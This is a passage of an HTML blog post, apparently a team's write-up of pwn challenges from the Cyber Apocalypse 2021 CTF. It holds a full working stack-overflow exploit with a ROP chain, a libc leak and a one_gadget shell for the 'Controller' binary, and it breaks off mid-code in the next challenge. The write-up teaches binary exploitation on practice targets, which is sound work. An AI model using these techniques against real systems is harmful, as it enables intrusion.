@@ -1,0 +1,813 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content="Thalium Team"><meta name=description content="Thalium blog."><meta name=keywords content="blog,tech"><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.111.3"><link rel=canonical href=/posts/apocalypse2021-pwn/><meta property="og:title" content="Cyber Apocalypse 2021 1/5 - PWN challenges"><meta property="og:description" content="Thalium participated in the Cyber Apocalypse 2021 CTF organized last week by HackTheBox.
+It was a great success with 4,740 teams composed of around 10,000 hackers from all over the world.
+Our team finished in fifth place and solved sixty out of the sixty-two challenges:
+
+  
+    
+  
+
+This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:"><meta property="og:type" content="article"><meta property="og:url" content="/posts/apocalypse2021-pwn/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-04-28T12:00:00+01:00"><meta property="article:modified_time" content="2021-04-28T12:00:00+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Cyber Apocalypse 2021 1/5 - PWN challenges"><meta name=twitter:description content="Thalium participated in the Cyber Apocalypse 2021 CTF organized last week by HackTheBox.
+It was a great success with 4,740 teams composed of around 10,000 hackers from all over the world.
+Our team finished in fifth place and solved sixty out of the sixty-two challenges:
+
+  
+    
+  
+
+This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:"><meta itemprop=name content="Cyber Apocalypse 2021 1/5 - PWN challenges"><meta itemprop=description content="Thalium participated in the Cyber Apocalypse 2021 CTF organized last week by HackTheBox.
+It was a great success with 4,740 teams composed of around 10,000 hackers from all over the world.
+Our team finished in fifth place and solved sixty out of the sixty-two challenges:
+
+  
+    
+  
+
+This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:"><meta itemprop=datePublished content="2021-04-28T12:00:00+01:00"><meta itemprop=dateModified content="2021-04-28T12:00:00+01:00"><meta itemprop=wordCount content="4353"><meta itemprop=keywords content="CTF,Writeup,CyberApocalypse2021,"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=icon href=/favicon.ico><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-141692648-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><title>Cyber Apocalypse 2021 1/5 - PWN challenges</title><script>MathJax={tex:{inlineMath:[["∳","∳"]],displayMath:[["∳∳","∳∳"]],processEscapes:!0},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js></script></head><body><style>@font-face{font-family:days_one;src:url(/blog/days_one.ttf)format('truetype')}.siteTitle{margin-top:24px}.siteTitle img{display:inline-block;vertical-align:middle;margin-top:-24px;margin-right:-10px}.siteTitle span{font-family:days_one,Fallback,sans-serif;color:#fff;font-size:160%}</style><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=/><img src=/shard_only_no_background.png width=12%></img>
+<span>THALIUM</span></a></div><a class=nav-item href=/posts/><div class=nav-item-title>Posts</div></a><a class=nav-item href=/joinus/><div class=nav-item-title>Join Us</div></a><a class=nav-item href=/about/><div class=nav-item-title>About</div></a></nav><div class=social-links-header><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>Github</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div></div></header><article class=post><h1 class=title>Cyber Apocalypse 2021 1/5 - PWN challenges</h1><div class=content><p>Thalium participated in the <a href=https://www.hackthebox.eu/cyber-apocalypse-ctf-2021>Cyber Apocalypse 2021</a> CTF organized last week by <a href=https://www.hackthebox.eu/>HackTheBox</a>.
+It was a great success with 4,740 teams composed of around 10,000 hackers from all over the world.
+Our team finished in fifth place and solved sixty out of the sixty-two challenges:</p><p><a href=/posts/img/Cyber_Apocalypse_2021-scoreboard.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-scoreboard.png alt=fig_scoreboard></a></p><p>This article explains how we solved each pwn challenge and what tools we used, it is written to be accessible to beginners:</p><ul><li><a href=#controller---difficulty-14>Controller</a></li><li><a href=#minefield---difficulty-14>Minefield</a></li><li><a href=#system-drop---difficulty-14>System dROP</a></li><li><a href=#harvester---difficulty-24>Harvester</a></li><li><a href=#save-the-environment---difficulty-24>Save the environment</a></li></ul><p>We also explain how we solved a misc challenge that could have been in the pwn category:</p><ul><li><a href=#close-the-door---difficulty-24>Close the door</a></li></ul><p>We also publish our solutions to some challenges in other categories:</p><ul><li><a href=/posts/apocalypse2021-wii-phit/>Wii-Phit</a>: crypto, solved by 38 teams</li><li><a href=/posts/apocalypse2021-off-the-grid/>Off-the-grid</a>: hardware, solved by 99 teams</li><li><a href=/posts/apocalypse2021-discovery/>Discovery</a>: hardware, solved by 17 teams</li><li><a href=/posts/apocalypse2021-artillery/>Artillery</a>: web, solved by 45 teams</li></ul><h2 id=tooling>Tooling</h2><p>For tooling we used:</p><ul><li><p><a href=https://www.hex-rays.com/ida-pro/>IDA</a> for binary analysis;</p></li><li><p><a href=https://github.com/JonathanSalwan/ROPgadget>ROPGadget</a> to find gadgets and help to build ROP chains;</p></li><li><p><a href=https://github.com/david942j/one_gadget>OneGadget</a> to find libc addresses that give a shell;</p></li><li><p>a custom <a href=https://github.com/Gallopsled/pwntools>pwntools</a> template (available in the <a href=#template-script-for-exploitation-based-on-pwntoolshttpsgithubcomgallopsledpwntools>appendix</a>) that eases the following actions:</p><ul><li>Communicating with the target process (local or remote for flag!);</li><li>Launching debugger with breakpoints automatically set ;</li><li>Easily retrieving information such as function offset or symbols offset inside libraries and binaries;</li><li>Executing the target process with a specific libc and a specific dynamic linker.</li></ul></li></ul><p>Each challenge implements a specific communication scheme, thus, we have to adapt the content of the <code>exploit</code> function of the template to correctly interact with the binary, and leverage its vulnerabilities to retrieve the flag. To run the local binary without debugger the script must be used as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>python script.py ./my_binary
+</span></span></code></pre></div><p>To run the program with a debugger attached:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>python script.py ./my_binary -d
+</span></span></code></pre></div><p>The most important thing is to run the binary with the target versions of dynamic linker and c runtime library. To ensure this:</p><ul><li>Download the <a href=/posts/binaries/Cyber_Apocalypse_2021/ld-linux-x86-64.so.zip>ld binary</a> provided</li><li>Copy the ld binary inside your library path and rename it <code>ld-2.27.so</code></li><li>Copy the libc provided by the challenge and rename it <code>libc-2.27.so</code></li><li>Run the script whith the following parameters</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>python script.py ./my_binary -libc 2.27 
+</span></span></code></pre></div><p>The version of library can be changed if needed but this is the version used for all pwn challenges - and misc close_the_door - during this ctf.</p><p>Finally, to use the exploit against the remote infrastructure:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>python script.py ./environment -libc 2.27 -r <span style=color:#f92672>[</span>IP<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>PORT<span style=color:#f92672>]</span> 
+</span></span></code></pre></div><h2 id=controller---difficulty-14>Controller - Difficulty 1/4</h2><p><em>Challenge files: <a href=/posts/binaries/Cyber_Apocalypse_2021/pwn_controller.zip>pwn_controller.zip</a></em></p><p><code>Controller</code> is a <strong>64 bits ELF</strong>, which asks the user to choose a simple arithmetic operation and enter two operands. Numbers provided cannot be greater than 69.</p><p><a href=/posts/img/Cyber_Apocalypse_2021-controller.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-controller.png alt=fig_controller></a></p><h3 id=attack-method>Attack method</h3><p>We notice an interesting function, <code>calculator</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>calculator</span>(<span style=color:#66d9ef>__int64</span> a1)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>__int64</span> result; <span style=color:#75715e>// rax
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> buff[<span style=color:#ae81ff>28</span>]; <span style=color:#75715e>// [rsp+0h] [rbp-20h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> calc_value; <span style=color:#75715e>// [rsp+1Ch] [rbp-4h]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  calc_value <span style=color:#f92672>=</span> <span style=color:#a6e22e>calc</span>();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( calc_value <span style=color:#f92672>!=</span> <span style=color:#ae81ff>65338</span> )
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>calculator</span>(a1);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printstr</span>(<span style=color:#e6db74>&#34;Something odd happened!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Do you want to report the problem?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; &#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, buff);
+</span></span><span style=display:flex><span>  [...]
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>If the operation result is <strong>65338</strong>, we may access a juicy scanf that will overflow the stack buffer <code>buff</code>.</p><h4 id=found-a-way-to-access-to-the-scanf>Found a way to access to the scanf</h4><p>We notice that the calculation is done with <strong>signed int</strong> but the result is stored inside an <strong>unsigned int</strong> into the function <code>calc</code>. After a few tries we found that <code>66 * -3</code> results in the target value.</p><p><a href=/posts/img/Cyber_Apocalypse_2021-controller_calc.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-controller_calc.png alt=fig_controller_good_calculation></a></p><h4 id=exploit-the-stack-overflow-with-scanf>Exploit the stack overflow with scanf</h4><p>Now we can access the scanf and overflow the stack. Protections are as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;controller&#39;</span>
+</span></span><span style=display:flex><span>    Arch:     amd64-64-little
+</span></span><span style=display:flex><span>    RELRO:    Full RELRO
+</span></span><span style=display:flex><span>    Stack:    No canary found
+</span></span><span style=display:flex><span>    NX:       NX enabled
+</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>No PIE and No canary found: we will build a ropchain. There is no magic / hidden function inside the binary, so we use <code>one_gadget</code> to list available automatic shell gadgets and their constraints:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>0x4f3d5</span> <span style=color:#a6e22e>execve</span>(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>0x40</span>, environ)
+</span></span><span style=display:flex><span>constraints:
+</span></span><span style=display:flex><span>  rsp <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xf</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  rcx <span style=color:#f92672>==</span> NULL
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0x4f432</span> <span style=color:#a6e22e>execve</span>(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>0x40</span>, environ)
+</span></span><span style=display:flex><span>constraints:
+</span></span><span style=display:flex><span>  [rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>0x40</span>] <span style=color:#f92672>==</span> NULL
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0x10a41c</span> <span style=color:#a6e22e>execve</span>(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>0x70</span>, environ)
+</span></span><span style=display:flex><span>constraints:
+</span></span><span style=display:flex><span>  [rsp<span style=color:#f92672>+</span><span style=color:#ae81ff>0x70</span>] <span style=color:#f92672>==</span> NULL
+</span></span></code></pre></div><p>A new problem arises. We have only one scanf to send our payload to leak the libc base address and jump to the one gadget.
+The solution here is to call again scanf with the ROP payload, to calculate the one gadget address and put it somewhere into the binary.
+The ROP payload will then call this address.</p><p><a href=/posts/img/Cyber_Apocalypse_2021-controller_exploit.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-controller_exploit.png alt=fig_controller_exploit_schema></a></p><h3 id=exploitation>Exploitation</h3><p>This is how we perform the three steps explained before.</p><h4 id=1-leak-the-libc-address>1. Leak the libc address</h4><p>We use the <code>puts</code> function present inside <code>controller</code> to leak the libc address of the <code>printf</code> function.</p><p>Using ROPGadget we found the following one to set the put parameter in place:</p><pre tabindex=0><code>0x00000000004011d3 : pop rdi ; ret
+</code></pre><p>So the ROP part for this section is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>gadget_pop_rdi     <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4011d3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Set parameters before call puts</span>
+</span></span><span style=display:flex><span>ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rdi) <span style=color:#f92672>+</span> p64(elf<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;printf&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#75715e># Call puts</span>
+</span></span><span style=display:flex><span>ropchain <span style=color:#f92672>+=</span> p64(elf<span style=color:#f92672>.</span>plt[<span style=color:#e6db74>&#39;puts&#39;</span>])
+</span></span></code></pre></div><h4 id=2-recall-scanf-after-the-leak>2. Recall scanf after the leak</h4><p>We must pass two parameters to <code>scanf</code>. The first one is the format, and the second one is the address of the destination buffer that will be filled by <code>scanf</code> according to the format string.</p><p>We used the format string <code>%s</code> present inside the controller binary:</p><pre tabindex=0><code>.rodata:00000000004013E6 aS              db &#39;%s&#39;,0 
+</code></pre><p>We choose a writable memory address to be filled with the one gadget addr: <code>0x602100</code>. We load this address into <code>rsi</code> with the new gadget:</p><pre tabindex=0><code>0x00000000004011d1 : pop rsi ; pop r15 ; ret
+</code></pre><p>There is still a problem. If the stack is not aligned during the <code>scanf</code> call, a crash happens because <code>scanf</code> uses xmm registers. Aligning the stack is not terribly difficult, one simply has to add a useless <code>ret</code>, which subtracts eight bytes from <code>rsp</code> before calling <code>scanf</code>:</p><pre tabindex=0><code>0x0000000000400606 : ret
+</code></pre><p>The ROP part for this section is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>gadget_pop_rsi_r15 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4011d1</span>
+</span></span><span style=display:flex><span>gadget_ret         <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x400606</span>
+</span></span><span style=display:flex><span>format_string_s    <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4013E6</span>
+</span></span><span style=display:flex><span>target_addr        <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x602100</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Set parameters before call scanf</span>
+</span></span><span style=display:flex><span>ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rdi) <span style=color:#f92672>+</span> p64(format_string_s)
+</span></span><span style=display:flex><span>ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rsi_r15) <span style=color:#f92672>+</span> p64(target_addr) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span><span style=color:#75715e># Realign the stack to 0x10</span>
+</span></span><span style=display:flex><span>ropchain <span style=color:#f92672>+=</span> p64(gadget_ret)
+</span></span><span style=display:flex><span><span style=color:#75715e># Call scanf</span>
+</span></span><span style=display:flex><span>ropchain <span style=color:#f92672>+=</span> p64(elf<span style=color:#f92672>.</span>plt[<span style=color:#e6db74>&#39;__isoc99_scanf&#39;</span>])
+</span></span></code></pre></div><h4 id=3-call-the-one-gadget>3. Call the one gadget</h4><p>The following gadget allow to do an indirect call:</p><pre tabindex=0><code>0x00000000004011b0: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+8*rbx]
+</code></pre><p>We must master registers r12 and rbx to call the one gadget function. The last gadget allow us to do that:</p><pre tabindex=0><code>0x00000000004011ca: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+</code></pre><p>The ROP part for this section is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>gadget_pop_rbx_      <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4011ca</span>
+</span></span><span style=display:flex><span>gadget_indirect_call <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4011b0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Set value to registers</span>
+</span></span><span style=display:flex><span>rbx <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0</span>
+</span></span><span style=display:flex><span>ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rbx_) <span style=color:#f92672>+</span> p64(rbx) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> p64(target_addr) <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>*</span>p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span><span style=color:#75715e># Call the one gadget !</span>
+</span></span><span style=display:flex><span>ropchain <span style=color:#f92672>+=</span> p64(gadget_indirect_call)
+</span></span></code></pre></div><h4 id=4-put-it-all-together>4. Put it all together</h4><p>This is the final payload to exploit this binary used with the base script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> time
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> struct <span style=color:#f92672>import</span> unpack
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_ropchain</span>(elf):
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>32</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0xdeadbeef</span>) <span style=color:#75715e># rbp</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># -&gt; Now we are on RIP position</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 1. Leak the libc address</span>
+</span></span><span style=display:flex><span>    gadget_pop_rdi     <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4011d3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Set parameters before call puts</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rdi) <span style=color:#f92672>+</span> p64(elf<span style=color:#f92672>.</span>got[<span style=color:#e6db74>&#39;printf&#39;</span>])
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Call puts</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> p64(elf<span style=color:#f92672>.</span>plt[<span style=color:#e6db74>&#39;puts&#39;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 2. Recall scanf after the leak</span>
+</span></span><span style=display:flex><span>    gadget_pop_rsi_r15 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4011d1</span>
+</span></span><span style=display:flex><span>    gadget_ret         <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x400606</span>
+</span></span><span style=display:flex><span>    format_string_s    <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4013E6</span>
+</span></span><span style=display:flex><span>    target_addr        <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x602100</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Set parameters before call scanf</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rdi) <span style=color:#f92672>+</span> p64(format_string_s)
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rsi_r15) <span style=color:#f92672>+</span> p64(target_addr) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Realign the stack to 0x10</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> p64(gadget_ret)
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Call scanf</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> p64(elf<span style=color:#f92672>.</span>plt[<span style=color:#e6db74>&#39;__isoc99_scanf&#39;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 3. Call the one gadget</span>
+</span></span><span style=display:flex><span>    gadget_pop_rbx_      <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4011ca</span>
+</span></span><span style=display:flex><span>    gadget_indirect_call <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4011b0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Set value to registers</span>
+</span></span><span style=display:flex><span>    rbx <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> p64(gadget_pop_rbx_) <span style=color:#f92672>+</span> p64(rbx) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> p64(target_addr) <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>*</span>p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Call the one gadget !</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> p64(gadget_indirect_call)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Set 0 to match one gadget condition</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>256</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ropchain
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(p, elf, libc):
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Access to scanf after the good calculation</span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;of recources: &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;66 -3&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&gt; &#39;</span>)
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Now we can trigger scanf</span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;problem?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; &#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Create ROP chain</span>
+</span></span><span style=display:flex><span>    ropchain <span style=color:#f92672>=</span> get_ropchain(elf)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Send ROP chain</span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(ropchain)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Read data to get printf addr inside libc</span>
+</span></span><span style=display:flex><span>    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>4.0</span>) <span style=color:#75715e># wait before puts execute</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recv()
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    elms <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    x <span style=color:#f92672>=</span> elms[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span>(len(x) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>8</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> len(x) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>8</span>:
+</span></span><span style=display:flex><span>        x <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    leak <span style=color:#f92672>=</span> unpack(<span style=color:#e6db74>&#39;Q&#39;</span>, x)[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;leak printf@0x</span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> leak)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    libc_base <span style=color:#f92672>=</span> leak <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;printf&#39;</span>]
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;leak libc@0x</span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> libc_base)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Send one gadget inside the new scanf call</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    one_gadget <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4f432</span> 
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;one_gadget @0x</span><span style=color:#e6db74>%x</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> one_gadget)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(p64(one_gadget))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Enjoy the shell !</span>
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><p>We get a shell :):</p><p><a href=/posts/img/Cyber_Apocalypse_2021-controller_shell.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-controller_shell.png alt=fig_controller_shell></a></p><h2 id=minefield---difficulty-14>Minefield - Difficulty 1/4</h2><p><em>Challenge files: <a href=/posts/binaries/Cyber_Apocalypse_2021/pwn_mindfield.zip>pwn_mindfield.zip</a></em></p><p><code>Minefield</code> is a <strong>64 bits ELF</strong> that asks questions to the user to plant a mine:</p><p><a href=/posts/img/Cyber_Apocalypse_2021-minefield.png target=_blank><img src=/posts/img/Cyber_Apocalypse_2021-minefield.png alt=fig_controller_minefield></a></p><h3 id=attack-method-1>Attack method</h3><p>This challenge is a very basic one. The inputs <strong>type</strong> and <strong>location</strong> allow to write something at a controlled address:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Insert type of mine: 